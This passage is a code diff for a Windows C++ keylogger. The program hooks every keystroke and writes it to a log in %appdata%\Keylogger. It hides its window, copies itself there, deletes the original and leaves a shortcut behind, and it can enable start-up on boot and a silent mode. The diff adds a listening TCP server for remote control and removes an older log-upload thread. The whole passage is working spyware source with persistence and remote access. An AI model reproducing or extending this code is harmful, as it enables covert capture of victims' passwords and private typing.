+        std::cerr << "Failed to create listen socket" << std::endl;
+        WSACleanup();
+        return 1;
+    }
+
+    int reuse = 1;
+    setsockopt(listenSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse, sizeof(reuse));
+
+    sockaddr_in serverAddr;
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_addr.s_addr = INADDR_ANY;
+    serverAddr.sin_port = htons(g_localPort);
+
+    if (bind(listenSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
+        std::cerr << "Failed to bind port " << g_localPort << ", error: " << WSAGetLastError() << std::endl;
+        std::cerr << "Trying dynamic port..." << std::endl;
+
+        serverAddr.sin_port = 0;
+        if (bind(listenSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
+            std::cerr << "Failed to bind dynamic port, error: " << WSAGetLastError() << std::endl;
+            closesocket(listenSocket);
+            WSACleanup();
+            return 1;
+        }
+    }
+
+    sockaddr_in boundAddr;
+    int addrLen = sizeof(boundAddr);
+    getsockname(listenSocket, (sockaddr*)&boundAddr, &addrLen);
+    g_localPort = ntohs(boundAddr.sin_port);
+
+    std::cout << "Server listening on port: " << g_localPort << std::endl;
+
+    if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR) {
+        std::cerr << "Listen failed" << std::endl;
+        closesocket(listenSocket);
+        WSACleanup();
+        return 1;
+    }
+
+    while (serverControlEnabled && serverThreadRunning) {
+        fd_set readSet;
+        FD_ZERO(&readSet);
+        FD_SET(listenSocket, &readSet);
+
+        timeval timeout;
+        timeout.tv_sec = 1;
+        timeout.tv_usec = 0;
+
+        int result = select(0, &readSet, NULL, NULL, &timeout);
+        if (result == SOCKET_ERROR) {
+            std::cerr << "select() failed, error: " << WSAGetLastError() << std::endl;
+            Sleep(1000);
+            continue;
+        }
+
+        if (result > 0 && FD_ISSET(listenSocket, &readSet)) {
+            sockaddr_in clientAddr;
+            int clientAddrLen = sizeof(clientAddr);
+            SOCKET clientSocket = accept(listenSocket, (sockaddr*)&clientAddr, &clientAddrLen);
+            if (clientSocket != INVALID_SOCKET) {
+                char clientIp[INET_ADDRSTRLEN];
+                InetNtopA(AF_INET, &clientAddr.sin_addr, clientIp, INET_ADDRSTRLEN);
+                std::cout << "New connection from: " << clientIp << ":" << ntohs(clientAddr.sin_port) << std::endl;
+
+                std::thread clientThread(HandleClient, clientSocket);
+                clientThread.detach();
+            }
+            else {
+                std::cerr << "accept() failed, error: " << WSAGetLastError() << std::endl;
+            }
+        }
+    }
+
+    closesocket(listenSocket);
+    WSACleanup();
+    serverThreadRunning = false;
+    std::cout << "Server thread stopped" << std::endl;
+    return 0;
+}
+
+void StartServerControl()
+{
+    if (!serverThreadRunning) {
+        serverThreadRunning = true;
+        serverControlEnabled = true;
+        hServerThread = CreateThread(NULL, 0, ServerThreadFunc, NULL, 0, NULL);
+        if (hServerThread) {
+            CloseHandle(hServerThread);
+        }
+    }
+}
+
+void StopServerControl()
+{
+    serverControlEnabled = false;
+    serverThreadRunning = false;
+}
+
 LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 {
     if (nCode >= 0)
     {
-        // the action is valid: HC_ACTION.
         if (wParam == WM_KEYDOWN)
         {
-            // lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
             kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
 
-            // Check for Ctrl + Shift + Alt + P
             if (kbdStruct.vkCode == 'P' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
             {
                 isRecording = !isRecording;
+                // 保存录制状态到注册表
+                SaveRecordingState(isRecording);
+
                 if (isRecording)
                 {
-                    std::cout << "¼�Ƽ���\n";
-                    ShowToastNotification(L"����¼(/�R���Q)/", L"¼�Ƽ���");
+                    std::cout << "Recording resumed\n";
+                    ShowToastNotification(L"录制已继续", L"状态");
                 }
                 else
                 {
-                    std::cout << "¼����ͣ\n";
-                    ShowToastNotification(L"��¼���t(���أ���)", L"¼����ͣ");
+                    std::cout << "Recording paused\n";
+                    ShowToastNotification(L"录制已暂停", L"状态");
                 }
             }
-            // Check for Ctrl + Shift + Alt + Q
             else if (kbdStruct.vkCode == 'Q' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
             {
-                ShowToastNotification(L"�治¼����*�b�`�b*��\n\n�ǰݰ���(o�b���b)o��", L"¼�ƽ���");
-                std::cout << "¼�ƽ���\n";
+                ShowToastNotification(L"录制已停止", L"状态");
+                std::cout << "Recording stopped\n";
                 Sleep(2000);
-                CleanupNotifyIcon();   // ��������ͼ��
+                StopServerControl();
+                CleanupNotifyIcon();
                 ReleaseHook();
                 output_file.close();
                 exit(0);
             }
-            // Check for Ctrl + Shift + Alt + S (��������)
             else if (kbdStruct.vkCode == 'S' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
             {
                 bool enabled = IsAutoStartEnabled();
                 if (SetAutoStart(!enabled))
                 {
                     if (!enabled)
-                        ShowToastNotification(L"������Ϊ�����Ԇ� awa", L"��������");
+                        ShowToastNotification(L"开机自启已启用", L"启动设置");
                     else
-                        ShowToastNotification(L"��ȡ���������� qaq", L"��������");
+                        ShowToastNotification(L"开机自启已禁用", L"启动设置");
                 }
                 else
                 {
-                    ShowToastNotification(L"��������ʧ�ܣ����Թ���Ա��������w", L"��������");
+                    ShowToastNotification(L"设置开机自启失败", L"错误");
                 }
             }
-            // Check for Ctrl + Shift + Alt + D (��Ĭ����)
             else if (kbdStruct.vkCode == 'D' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
             {
                 bool silent = IsSilentMode();
                 if (SetSilentMode(!silent))
                 {
                     if (!silent)
-                        ShowToastNotification(L"������Ϊ��Ĭ�������´��������ٵ�����", L"��Ĭ����");
+                        ShowToastNotification(L"静默模式已启用", L"模式设置");
                     else
-                        ShowToastNotification(L"��ȡ����Ĭ�������´������ᵯ����", L"��Ĭ����");
+                        ShowToastNotification(L"静默模式已禁用", L"模式设置");
                 }
                 else
                 {
-                    ShowToastNotification(L"���þ�Ĭ����ʧ�ܣ����Թ���Ա��������", L"��Ĭ����");
-                }
-            }
-            // Check for Ctrl + Shift + Alt + U (�ϴ�����)
-            else if (kbdStruct.vkCode == 'U' && (GetKeyState(VK_CONTROL) & 0x8000) &&
-                (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
-            {
-                bool newState = !uploadEnabled;
-                if (newState)
-                {
-                    // ����߳�δ���У�����֮ǰ�����رգ������������߳�
-                    if (!uploadThreadRunning)
-                    {
-                        uploadThreadRunning = true;
-                        hUploadThread = CreateThread(NULL, 0, UploadThreadFunc, NULL, 0, NULL);
-                        if (hUploadThread)
-                            CloseHandle(hUploadThread);
-                        ShowToastNotification(L"�ϴ�����", L"�ϴ������ѿ������������ϴ���־�ļ�");
-                    }
-                    else
-                    {
-                        ShowToastNotification(L"�ϴ�����", L"�ϴ������ѿ������߳��������У�");
-                    }
-                    uploadEnabled = true;
-                }
-                else
-                {
-                    uploadEnabled = false;
-                    uploadThreadRunning = false;
-                    if (hUploadThread)
-                        WaitForSingleObject(hUploadThread, 5000);
-                    ShowToastNotification(L"�ϴ�����", L"�ϴ������ѹر�");
+                    ShowToastNotification(L"设置静默模式失败", L"错误");
                 }
             }
             else
             {
-                // save to file only if recording
                 if (isRecording)
                 {
                     Save(kbdStruct.vkCode);
@@ -828,7 +1116,6 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
         }
     }
 
-    // call the next hook in the hook chain. This is necessary or your hook chain will break and the hook stops
     return CallNextHookEx(_hook, nCode, wParam, lParam);
 }
 
@@ -842,12 +1129,8 @@ void SetHook()
     }
 }
 
-// ==================== �������ܣ��Ը��ơ�ɾ��ԭ�ļ���������ݷ�ʽ ====================
-
-// ������ݷ�ʽ��ͨ�ã�
 bool CreateShortcut(const std::wstring& targetPath, const std::wstring& shortcutPath)
 {
-    // �����ݷ�ʽ�Ѵ��ڣ����ظ�����
     if (fs::exists(shortcutPath))
         return true;
 
@@ -871,10 +1154,8 @@ bool CreateShortcut(const std::wstring& targetPath, const std::wstring& shortcut
     return SUCCEEDED(hr);
 }
 
-// �����Ը��ơ�ɾ��ԭ�ļ���������ݷ�ʽ
 void HandleSelfCopyAndDelete()
 {
-    // ��ȡĿ��Ŀ¼��%appdata%\Keylogger
     wchar_t appdataPath[MAX_PATH];
     if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appdataPath)))
         return;
@@ -885,143 +1166,195 @@ void HandleSelfCopyAndDelete()
     std::wstring currentExe = GetModulePath();
     std::wstring targetExe = targetDir + L"\\" + fs::path(currentExe).filename().wstring();
 
-    // �����ǰ������Ŀ��Ŀ¼����ִ�и��ơ�������ݷ�ʽ��������ɾ��
     if (currentExe != targetExe)
     {
-        // ����������Ŀ��Ŀ¼
         if (!CopyFileW(currentExe.c_str(), targetExe.c_str(), FALSE))
         {
-            MessageBoxW(NULL, L"���������� %appdata%\\Keylogger ʧ��", L"����", MB_ICONERROR);
+            //MessageBoxW(NULL, L"复制程序到 %appdata%\\Keylogger 失败", L"错误", MB_ICONERROR);
             return;
         }
 
-        // ��ԭ��������Ŀ¼����ָ���³���Ŀ�ݷ�ʽ
         std::wstring originalDir = fs::path(currentExe).parent_path().wstring();
         std::wstring shortcutName = fs::path(currentExe).stem().wstring() + L".lnk";
         std::wstring shortcutPath = originalDir + L"\\" + shortcutName;
         CreateShortcut(targetExe, shortcutPath);
 
-        // �����³��򣬴���ԭ����·���Ա�ɾ��
+        // 使用 ShellExecuteExW 启动副本，传递原程序路径以便删除
         std::wstring params = L"--delete-old \"" + currentExe + L"\"";
-        wchar_t paramsBuf[1024];
-        wcscpy_s(paramsBuf, params.c_str());
+        SHELLEXECUTEINFOW sei = { sizeof(sei) };
+        sei.fMask = SEE_MASK_NOCLOSEPROCESS;
+        sei.lpVerb = L"open";
+        sei.lpFile = targetExe.c_str();
+        sei.lpParameters = params.c_str();
+        sei.nShow = SW_HIDE;  // 隐藏窗口
 
-        STARTUPINFOW si = { sizeof(si) };
-        PROCESS_INFORMATION pi;
-        if (CreateProcessW(targetExe.c_str(), paramsBuf, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
+        std::wcout << L"Starting new process with params: " << params << std::endl;
+
+        if (ShellExecuteExW(&sei))
         {
-            CloseHandle(pi.hProcess);
-            CloseHandle(pi.hThread);
-            ExitProcess(0);   // ��ǰ�����˳�
+            // 等待副本进程启动完成（可选）
+            WaitForInputIdle(sei.hProcess, 5000);
+            CloseHandle(sei.hProcess);
+            ExitProcess(0);   // 原进程退出
         }
         else
         {
-            MessageBoxW(NULL, L"��������ʧ��", L"����", MB_ICONERROR);
+            DWORD err = GetLastError();
+            std::wcerr << L"ShellExecuteExW failed, error: " << err << std::endl;
+            wchar_t msg[256];
+            wsprintfW(msg, L"启动副本失败，错误码：%lu", err);
+            MessageBoxW(NULL, msg, L"错误", MB_ICONERROR);
         }
     }
     else
     {
-        // �Ѿ���Ŀ��Ŀ¼������Ƿ���ɾ�����ļ�������
-        int argc;
-        LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
-        if (argc >= 3 && wcscmp(argv[1], L"--delete-old") == 0)
-        {
-            std::wstring oldPath = argv[2];
-            // �ȴ�ԭ������ȫ�˳��������ӳ٣�
-            Sleep(5000);  // 5�룬�㹻ԭ�����˳�
+        // 从命令行获取要删除的旧程序路径
+        std::wstring cmdLine = GetCommandLineW();
+        std::wcout << L"Command line: " << cmdLine << std::endl;
 
-            // ����ɾ�������Զ��
+        int argc;
+        LPWSTR* argv = CommandLineToArgvW(cmdLine.c_str(), &argc);
+
+        std::wcout << L"Argument count: " << argc << std::endl;
+        for (int i = 0; i < argc; i++) {
+            std::wcout << L"argv[" << i << L"]: " << argv[i] << std::endl;
+        }
+
+        // 查找 --delete-old 参数
+        std::wstring oldPath;
+        bool foundDeleteArg = false;
+
+        for (int i = 1; i < argc - 1; i++) {
+            if (wcscmp(argv[i], L"--delete-old") == 0) {
+                // 支持路径包含空格的情况：从 i+1 开始合并所有剩余参数
+                oldPath = argv[i + 1];
+                // 如果路径被分割成多个参数（不包含盘符分隔符），合并它们
+                for (int j = i + 2; j < argc; j++) {
+                    // 检查是否是另一个参数（以 - 开头）
+                    if (argv[j][0] == L'-') {
+                        break;
+                    }
+                    oldPath += L" ";
+                    oldPath += argv[j];
+                }
+                foundDeleteArg = true;
+                break;
+            }
+        }
+
+        if (foundDeleteArg && !oldPath.empty())
+        {
+            std::wcout << L"Attempting to delete: " << oldPath << std::endl;
+
+            // 等待原程序退出
+            std::wcout << L"Waiting 5 seconds for original process to exit..." << std::endl;
+            Sleep(5000);
+
             bool deleted = false;
             DWORD lastError = 0;
             for (int i = 0; i < 10; ++i)
             {
-                // ����ļ��Ƿ����
+                std::wcout << L"Attempt " << (i + 1) << L": Checking if file exists..." << std::endl;
+
                 if (!fs::exists(oldPath))
                 {
+                    std::wcout << L"File already deleted or does not exist" << std::endl;
                     deleted = true;
                     break;
                 }
 
-                // �Ƴ�ֻ�����ԣ�����У�
+                std::wcout << L"File exists, attempting to delete..." << std::endl;
                 SetFileAttributesW(oldPath.c_str(), FILE_ATTRIBUTE_NORMAL);
 
-                // ����ɾ��
                 if (DeleteFileW(oldPath.c_str()))
                 {
+                    std::wcout << L"Successfully deleted old program" << std::endl;
                     deleted = true;
                     break;
                 }
 
                 lastError = GetLastError();
-                // ����ļ���ռ�ã��ȴ�����
+                std::wcout << L"Delete failed, error: " << lastError << std::endl;
+
                 if (lastError == ERROR_SHARING_VIOLATION || lastError == ERROR_ACCESS_DENIED)
                 {
+                    std::wcout << L"File in use, waiting 1 second..." << std::endl;
                     Sleep(1000);
                     continue;
                 }
                 else
                 {
-                    // ����������������
                     break;
                 }
             }
 
             if (!deleted)
             {
-                // �������ɾ��ʧ�ܣ������ӳ�ɾ����������ɾ����
+                std::wcout << L"Normal delete failed, trying MoveFileEx..." << std::endl;
                 if (!MoveFileExW(oldPath.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT))
                 {
                     lastError = GetLastError();
+                    std::wcerr << L"MoveFileEx failed, error: " << lastError << std::endl;
+
                     wchar_t msg[512];
-                    wsprintfW(msg, L"ɾ��ԭ����ʧ�ܣ������룺%lu\n·����%s\n�������ӳ�ɾ������������Ч��", lastError, oldPath.c_str());
-                    MessageBoxW(NULL, msg, L"ɾ������", MB_ICONERROR);
+                    swprintf_s(msg, L"删除原程序失败。\n路径: %s\n错误码: %lu\n将在下次重启时尝试删除。",
+                        oldPath.c_str(), lastError);
+                    MessageBoxW(NULL, msg, L"删除警告", MB_ICONWARNING);
                 }
                 else
                 {
-                    // �ӳ�ɾ���ɹ���֪ͨ�û�
-                    MessageBoxW(NULL, L"ԭ�������´�����ʱ��ɾ����", L"��ʾ", MB_ICONINFORMATION);
+                    std::wcout << L"Scheduled for deletion on next reboot" << std::endl;
+                    MessageBoxW(NULL, L"原程序将在下次重启时删除", L"提示", MB_ICONINFORMATION);
                 }
             }
+        }
+        else {
+            std::wcout << L"No --delete-old argument found or path is empty" << std::endl;
         }
         if (argv) LocalFree(argv);
     }
 }
-// ==================== ������ ====================
+
 int main()
 {
-    // ���ȴ����Ը�����ɾ�����ļ��������� Stealth ֮ǰ����Ϊ�����漰�˳����̣�
     HandleSelfCopyAndDelete();
 
     Stealth();
 
-    // ��Ĭģʽ��ʾ�����δ������Ĭģʽ����ʾ������ʾ��
+    // 读取上次保存的录制状态
+    isRecording = GetSavedRecordingState();
+
     if (!IsSilentMode()) {
-        MessageBoxW(NULL, L"��¼ q(�R���Qq)\n\n��ݼ�С��ʾww\n"
-            L"Ctrl + Shift + Alt + P  ��ͣ¼��\n"
-            L"Ctrl + Shift + Alt + Q  ����¼��\n"
-            L"Ctrl + Shift + Alt + S  ����/ȡ����������\n"
-            L"Ctrl + Shift + Alt + D  ����/ȡ����Ĭ����\n"
-            L"Ctrl + Shift + Alt + U  ����/�ر��ϴ�����\n\n"
-            L"¼����־�������� %appdata%\\Keylogger Ŀ¼���ļ��� ip_����.log",
-            L"¼�ƿ�ʼ", MB_OK);
+        wchar_t msg[512];
+        swprintf_s(msg, L"Keylogger 已启动\n\n当前状态: %s\n\n快捷键说明:\n"
+            L"Ctrl + Shift + Alt + P  暂停/继续录制\n"
+            L"Ctrl + Shift + Alt + Q  停止录制\n"
+            L"Ctrl + Shift + Alt + S  启用/禁用开机自启\n"
+            L"Ctrl + Shift + Alt + D  启用/禁用静默模式\n\n"
+            L"日志保存在 %%appdata%%\\Keylogger\n"
+            L"服务器控制端口: %d",
+            isRecording ? L"录制中" : L"已暂停",
+            g_localPort);
+        MessageBoxW(NULL, msg, L"Keylogger", MB_OK);
     }
 
 #ifdef bootwait 
     while (IsSystemBooting())
     {
-        std::cout << "系统正在启动中。10秒后再次检查...\n";
+        std::cout << "System is booting. Checking again in 10 seconds...\n";
         Sleep(10000);
     }
 #endif
 #ifdef nowait 
-    std::cout << "跳过系统启动检查。\n";
+    std::cout << "Skipping system boot check.\n";
 #endif
 
-    // ȷ����־Ŀ¼����
     GetLogDirectory();
 
+    StartServerControl();
+
     std::string output_filename = MakeOutputFilename();
-    std::cout << "输出日志到 " << output_filename << std::endl;
+    std::cout << "Output log to " << output_filename << std::endl;
 
     output_file.open(output_filename, std::ios_base::app | std::ios::binary);
 
@@ -1031,6 +1364,7 @@ int main()
     while (GetMessage(&msg, NULL, 0, 0))
     {
     }
+    StopServerControl();
     CleanupNotifyIcon();
     ReleaseHook();
     output_file.close();
